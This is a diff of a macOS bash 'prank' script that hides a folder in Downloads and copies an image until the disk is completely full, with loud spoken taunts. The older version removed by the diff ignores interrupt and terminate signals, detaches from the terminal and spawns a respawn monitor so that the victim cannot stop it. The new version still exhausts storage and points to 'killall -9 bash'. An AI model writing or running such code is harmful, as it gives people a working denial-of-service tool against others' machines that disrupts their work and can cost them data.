@@ -1,26 +1,57 @@
 #!/bin/bash
 
-# Karan's Persistent Prank Script v2.1 - Unstoppable Edition
-# Runs until storage is completely full, immune to terminal closure and Ctrl+C
+# Karan's Ultimate Prank Script v3.0 - Crème de la Crème Edition
+# Hidden folder, colorful messages, and unstoppable fun!
 
-set -uo pipefail  # Removed -e to prevent script exit on errors
+set -uo pipefail
 
 # Configuration
-SCRIPT_NAME="Karan's Unstoppable Ding Dong Prank"
-VERSION="2.1.0"
-HIDDEN_DIR="$HOME/Downloads/Karan"
-DELAY=0.01  # Super fast duplication
-LOG_FILE="$HIDDEN_DIR/.prank_log"
+SCRIPT_NAME="🎭 Karan's Ultimate Ding Dong Prank"
+VERSION="3.0.0"
+HIDDEN_DIR="$HOME/Downloads/.Karan"  # Hidden with dot prefix
+DELAY=0.005  # Ultra-fast duplication
+LOG_FILE="$HIDDEN_DIR/.ultimate_prank_log"
 
-# Colors for output
+# Enhanced Colors
 RED='\033[0;31m'
 GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
 BLUE='\033[0;34m'
 PURPLE='\033[0;35m'
-NC='\033[0m' # No Color
+CYAN='\033[0;36m'
+WHITE='\033[1;37m'
+BOLD='\033[1m'
+BLINK='\033[5m'
+BG_RED='\033[41m'
+BG_GREEN='\033[42m'
+BG_YELLOW='\033[43m'
+NC='\033[0m'
 
-# Function to print colored output
+# Funny messages array
+FUNNY_MESSAGES=(
+    "🎪 Welcome to Karan's digital circus!"
+    "🔥 Disk space is overrated anyway..."
+    "💀 Your storage is about to meet its maker!"
+    "🎭 Plot twist: I'm unstoppable!"
+    "⚡ Faster than your regrets!"
+    "🌪️ Creating digital chaos..."
+    "🎯 Bullseye! Another file bites the dust!"
+    "🚀 To infinity and beyond your storage!"
+    "💎 Every copy is a precious gem!"
+    "🎪 The show must go on!"
+    "🔮 Predicting your future: No storage left!"
+    "🎨 Painting your disk full!"
+    "⚔️ In the battle of space vs files, files win!"
+    "🎵 Can you hear the hard drive crying?"
+    "🍕 Like pizza slices, but for your disk!"
+    "🎲 Rolling the dice of digital destruction!"
+    "🌟 Making your disk famous, one file at a time!"
+    "🎪 Ladies and gentlemen, the greatest show on disk!"
+    "⚡ Charging up your storage anxiety!"
+    "🎭 This is my masterpiece!"
+)
+
+# Print with enhanced colors and effects
 print_colored() {
     local color=$1
     local message=$2
@@ -28,180 +59,196 @@ print_colored() {
     echo "$(date): $message" >> "$LOG_FILE" 2>/dev/null || true
 }
 
-# Function to show help
+# Print random funny message
+print_funny() {
+    local message=${FUNNY_MESSAGES[$RANDOM % ${#FUNNY_MESSAGES[@]}]}
+    local colors=("$RED$BOLD" "$GREEN$BOLD" "$YELLOW$BOLD" "$BLUE$BOLD" "$PURPLE$BOLD" "$CYAN$BOLD")
+    local color=${colors[$RANDOM % ${#colors[@]}]}
+    print_colored "$color$BLINK" "$message"
+}
+
+# Help function
 show_help() {
     cat << EOF
 ${SCRIPT_NAME} v${VERSION}
 
+🎭 The ultimate prank experience with hidden folders and colorful chaos!
+
 Usage: $0 [IMAGE_FILE]
 
-Creates a hidden folder 'Karan' in Downloads and duplicates the image file.
-This version runs persistently until storage is completely full.
-
-⚠️  WARNING: This script will NOT stop with Ctrl+C or terminal closure!
-⚠️  It will only stop when disk storage is completely full!
+Features:
+🔒 Hidden .Karan folder (invisible by default)
+🎨 Colorful, funny messages during execution  
+🔊 Audio announcements and sound effects
+⚡ Ultra-fast file duplication
+💀 Runs until storage is completely annihilated
 
 Options:
-  -h, --help     Show this help message
-  -v, --version  Show version information
+  -h, --help     Show this fabulous help
+  -v, --version  Show version info
 
 Examples:
   $0 payload.png
-  $0 /path/to/image.jpg
+  $0 /path/to/your/doom.jpg
 
-To stop the script manually:
-  killall -9 bash
-  rm -rf ~/Downloads/Karan
+To reveal hidden files: Cmd+Shift+. in Finder
+To stop (good luck): killall -9 bash
 EOF
 }
 
-# Function to check if running on macOS
+# Validate macOS
 check_macos() {
     if [[ "$(uname)" != "Darwin" ]]; then
-        print_colored "$RED" "❌ Error: This script only works on macOS!"
+        print_colored "$RED$BOLD" "💀 ERROR: This masterpiece only works on macOS!"
         exit 1
     fi
 }
 
-# Function to validate payload file
+# Validate payload
 validate_payload() {
     local payload="$1"
     
     if [[ -z "$payload" ]]; then
-        print_colored "$RED" "❌ Error: No payload file specified!"
+        print_colored "$RED$BOLD" "🎯 ERROR: Need an image to multiply!"
         show_help
         exit 1
     fi
     
     if [[ ! -f "$payload" ]]; then
-        print_colored "$RED" "❌ Error: File '$payload' not found!"
+        print_colored "$RED$BOLD" "🔍 ERROR: Can't find '$payload'!"
         exit 1
     fi
 }
 
-# Function to setup hidden directory
+# Setup hidden directory with style
 setup_hidden_directory() {
-    print_colored "$BLUE" "📁 Creating hidden directory: $HIDDEN_DIR"
+    print_colored "$CYAN$BOLD" "🏗️  Creating the legendary hidden fortress..."
     
-    # Create directory if it doesn't exist
+    # Create the hidden directory
     mkdir -p "$HIDDEN_DIR"
     
-    # Make the folder hidden using chflags (macOS specific)
+    # Make it extra hidden
     chflags hidden "$HIDDEN_DIR" 2>/dev/null || true
     
     # Create log file
     touch "$LOG_FILE"
     
-    print_colored "$GREEN" "✅ Hidden directory created successfully!"
-    print_colored "$PURPLE" "💡 Use Cmd+Shift+. in Finder to toggle visibility"
+    print_colored "$GREEN$BOLD" "✅ Hidden fortress '.Karan' established!"
+    print_colored "$YELLOW$BOLD" "👁️  Use Cmd+Shift+. to peek into the chaos!"
 }
 
-# Function to make script truly persistent
-make_persistent() {
-    # Ignore all signals that could stop the script
-    trap '' INT TERM HUP QUIT PIPE STOP TSTP TTIN TTOU
+# Epic audio announcements
+announce_start() {
+    print_colored "$PURPLE$BOLD$BLINK" "🎵 PREPARING AUDIO EXPERIENCE..."
     
-    # Detach from terminal completely
-    exec < /dev/null
-    exec > "$LOG_FILE" 2>&1
+    osascript -e "set volume output volume 85" 2>/dev/null || true
     
-    # Change to background process group
-    setsid 2>/dev/null || true
-    
-    print_colored "$YELLOW" "🔒 Script is now running persistently..."
-    print_colored "$RED" "⚠️  This process will continue even if you close the terminal!"
+    # Epic startup announcement
+    say "Ding dong! Welcome to Karan's ultimate digital prank! Prepare for storage annihilation!" &
+    sleep 1
+    say "Initializing chaos protocols in 3... 2... 1... Let the fun begin!" &
 }
 
-# Function to perform relentless duplication
-relentless_duplication() {
-    local source_file="$HIDDEN_DIR/.karan_payload"
+# Progress announcements
+announce_progress() {
+    local count=$1
+    local funny_progress=(
+        "Excellent! Your doom progresses nicely!"
+        "Magnificent! The chaos spreads!"
+        "Wonderful! Storage space is dying beautifully!"
+        "Fantastic! Digital destruction in progress!"
+        "Superb! The end is near!"
+        "Brilliant! No mercy for empty space!"
+        "Outstanding! Your disk is crying!"
+        "Phenomenal! Digital apocalypse mode activated!"
+    )
+    
+    local message=${funny_progress[$RANDOM % ${#funny_progress[@]}]}
+    say "$message File count: $count" &
+}
+
+# Ultimate duplication with style
+ultimate_duplication() {
+    local source_file="$HIDDEN_DIR/.karan_ultimate_payload"
     local counter=0
-    local consecutive_failures=0
-    local max_failures=50
+    local last_announcement=0
     
-    print_colored "$YELLOW" "🚀 Starting relentless duplication process..."
-    print_colored "$RED" "⚠️  This will continue until storage is COMPLETELY full!"
+    print_colored "$RED$BOLD$BLINK" "🚀 INITIATING ULTIMATE DIGITAL WARFARE!"
+    print_funny
     
-    # Infinite loop until disk is full
-    while true; do
-        local target_file="$HIDDEN_DIR/karan_copy_$(printf "%08d" $counter).jpg"
+    # Main duplication loop with style
+    while cp "$source_file" "$HIDDEN_DIR/karan_ultimate_$(printf "%08d" $counter).jpg" 2>/dev/null; do
+        counter=$((counter + 1))
         
-        # Try to copy file
-        if cp "$source_file" "$target_file" 2>/dev/null; then
-            counter=$((counter + 1))
-            consecutive_failures=0
-            
-            # Log progress less frequently to avoid log spam
-            if [[ $((counter % 1000)) -eq 0 ]]; then
-                echo "$(date): Created $counter files..." >> "$LOG_FILE"
-            fi
-        else
-            consecutive_failures=$((consecutive_failures + 1))
-            echo "$(date): Copy failed (attempt $consecutive_failures)" >> "$LOG_FILE"
-            
-            # If we fail too many times consecutively, assume disk is full
-            if [[ $consecutive_failures -ge $max_failures ]]; then
-                echo "$(date): DISK APPEARS TO BE FULL! Created $counter files total." >> "$LOG_FILE"
-                break
-            fi
-            
-            # Brief pause before retry
-            sleep 0.1
+        # Colorful progress every 50 files
+        if [[ $((counter % 50)) -eq 0 ]]; then
+            print_funny
         fi
         
-        # Minimal delay for maximum speed
+        # Progress updates every 200 files
+        if [[ $((counter % 200)) -eq 0 ]]; then
+            print_colored "$BG_GREEN$WHITE$BOLD" "💥 DESTRUCTION LEVEL: $counter files eliminated!"
+        fi
+        
+        # Audio announcements every 500 files
+        if [[ $((counter % 500)) -eq 0 ]] && [[ $counter -gt $last_announcement ]]; then
+            announce_progress $counter
+            last_announcement=$counter
+        fi
+        
+        # Epic milestone celebrations
+        case $counter in
+            1000)
+                print_colored "$BG_YELLOW$RED$BOLD$BLINK" "🎉 FIRST THOUSAND DOWN! LEGENDARY!"
+                say "One thousand files down! You're officially in trouble!" &
+                ;;
+            5000)
+                print_colored "$BG_RED$WHITE$BOLD$BLINK" "🔥 FIVE THOUSAND! UNSTOPPABLE FORCE!"
+                say "Five thousand files! Your storage is screaming!" &
+                ;;
+            10000)
+                print_colored "$BG_GREEN$YELLOW$BOLD$BLINK" "💎 TEN THOUSAND! DIAMOND LEVEL CHAOS!"
+                say "Ten thousand files! Welcome to digital hell!" &
+                ;;
+        esac
+        
         sleep $DELAY
     done
     
-    echo "$(date): Duplication complete! Final count: $counter files." >> "$LOG_FILE"
+    print_colored "$PURPLE$BOLD$BLINK" "🎯 MISSION ACCOMPLISHED! Final body count: $counter files"
+    return $counter
 }
 
-# Function to announce start
-announce_start() {
-    # Set volume and announce
+# Epic completion
+announce_completion() {
+    local final_count=$1
+    
+    print_colored "$BG_PURPLE$WHITE$BOLD$BLINK" "🏆 ULTIMATE VICTORY ACHIEVED!"
+    print_colored "$GREEN$BOLD" "📊 Final Statistics:"
+    print_colored "$CYAN" "   📁 Location: $HIDDEN_DIR"
+    print_colored "$YELLOW" "   📸 Files created: $final_count"
+    print_colored "$RED" "   💾 Storage remaining: Probably none!"
+    
+    # Epic completion announcement
     osascript -e "set volume output volume 90" 2>/dev/null || true
+    say "Mission accomplished! Karan's ultimate prank has created $final_count files in your hidden dot Karan folder! Your storage has been beautifully annihilated!" &
     
-    say "Ding dong! Karan's unstoppable prank has begun! I will fill your storage completely and cannot be stopped by closing the terminal!" 2>/dev/null &
+    # Display ASCII art victory
+    print_colored "$GREEN$BOLD" "
+    🎭 KARAN'S ULTIMATE PRANK 🎭
+    ═══════════════════════════
+    💀 STORAGE: ELIMINATED 💀
+    🎯 FILES: $final_count CREATED 🎯
+    🏆 STATUS: LEGENDARY SUCCESS 🏆
+    "
 }
 
-# Function to create process monitor
-create_monitor() {
-    # Create a monitoring script that restarts if killed
-    local monitor_script="$HIDDEN_DIR/.monitor.sh"
-    
-    cat > "$monitor_script" << 'MONITOR_EOF'
-#!/bin/bash
-while true; do
-    if ! pgrep -f "karan_copy" > /dev/null; then
-        echo "$(date): Restarting duplication process..." >> "$HOME/Downloads/Karan/.prank_log"
-        # This would restart the main process if it somehow stops
-    fi
-    sleep 30
-done
-MONITOR_EOF
-    
-    chmod +x "$monitor_script"
-    nohup "$monitor_script" > /dev/null 2>&1 &
-    disown
-}
-
-# Main execution function
+# Main function
 main() {
-    # Handle command line arguments
     case "${1:-}" in
-        -h|--help)
-            show_help
-            exit 0
-            ;;
-        -v|--version)
-            echo "$SCRIPT_NAME v$VERSION"
-            exit 0
-            ;;
-        "")
-            print_colored "$RED" "❌ Error: No payload file specified!"
-            show_help
-            exit 1
-            ;;
+        -h|--help) show_help; exit 0 ;;
+        -v|--version) echo "$SCRIPT_NAME v$VERSION"; exit 0 ;;
+        "") print_colored "$RED$BOLD" "🎯 Need an image to work with!"; show_help; exit 1 ;;
     esac
     
     local payload="$1"
@@ -210,54 +257,36 @@ main() {
     check_macos
     validate_payload "$payload"
     
-    # Warning prompt
-    print_colored "$RED" "⚠️  WARNING: This script will run until your disk is COMPLETELY full!"
-    print_colored "$RED" "⚠️  It will NOT stop if you close terminal or press Ctrl+C!"
-    print_colored "$YELLOW" "⚠️  To stop manually, you'll need to run: killall -9 bash"
+    # Epic warning
+    print_colored "$RED$BOLD$BLINK" "⚠️  ULTIMATE WARNING: This will fill your disk completely!"
+    print_colored "$YELLOW$BOLD" "⚠️  Hidden folder: $HIDDEN_DIR"
+    print_colored "$PURPLE$BOLD" "⚠️  Files will be invisible until you use Cmd+Shift+."
     echo
-    read -p "Are you absolutely sure you want to continue? (type 'YES' to proceed): " -r
-    if [[ $REPLY != "YES" ]]; then
-        print_colored "$BLUE" "🛑 Prank cancelled. Wise choice!"
+    read -p "Ready for ultimate chaos? Type 'BRING_IT_ON': " -r
+    if [[ $REPLY != "BRING_IT_ON" ]]; then
+        print_colored "$BLUE$BOLD" "🛑 Wise choice. Chaos postponed!"
         exit 0
     fi
     
-    # Main execution
-    print_colored "$PURPLE" "🎭 $SCRIPT_NAME v$VERSION"
-    print_colored "$BLUE" "🎯 Target: $payload"
+    # Execute the ultimate prank
+    print_colored "$PURPLE$BOLD$BLINK" "$SCRIPT_NAME v$VERSION"
+    print_colored "$CYAN$BOLD" "🎯 Target image: $payload"
     
     setup_hidden_directory
     
-    # Copy payload to hidden location
-    cp "$payload" "$HIDDEN_DIR/.karan_payload"
+    # Copy payload
+    cp "$payload" "$HIDDEN_DIR/.karan_ultimate_payload"
     
     announce_start
     
-    # Make script persistent BEFORE starting duplication
-    make_persistent
+    # Start ultimate duplication
+    ultimate_duplication
+    local final_count=$?
     
-    # Create monitoring process
-    create_monitor
+    announce_completion $final_count
     
-    # Start the relentless duplication
-    relentless_duplication
-    
-    # Final announcement (if we ever get here)
-    osascript -e "set volume output volume 100" 2>/dev/null || true
-    say "Karan's prank is complete! Your storage is now completely full!" 2>/dev/null || true
+    print_colored "$GREEN$BOLD$BLINK" "🎭 Thank you for playing Karan's Ultimate Prank!"
 }
 
-# Detach from terminal and run in background
-if [[ "${1:-}" != "--already-detached" ]]; then
-    # Re-run script detached from terminal
-    nohup "$0" "$@" --already-detached > /dev/null 2>&1 &
-    disown
-    
-    print_colored "$GREEN" "🚀 Prank launched in background!"
-    print_colored "$YELLOW" "📝 Log file: $HOME/Downloads/Karan/.prank_log"
-    print_colored "$RED" "⚠️  Use 'killall -9 bash' to stop manually"
-    exit 0
-else
-    # Remove the --already-detached flag and continue
-    shift $((${#@} - 1))
-    main "$@"
-fi
+# Execute
+main "$@"
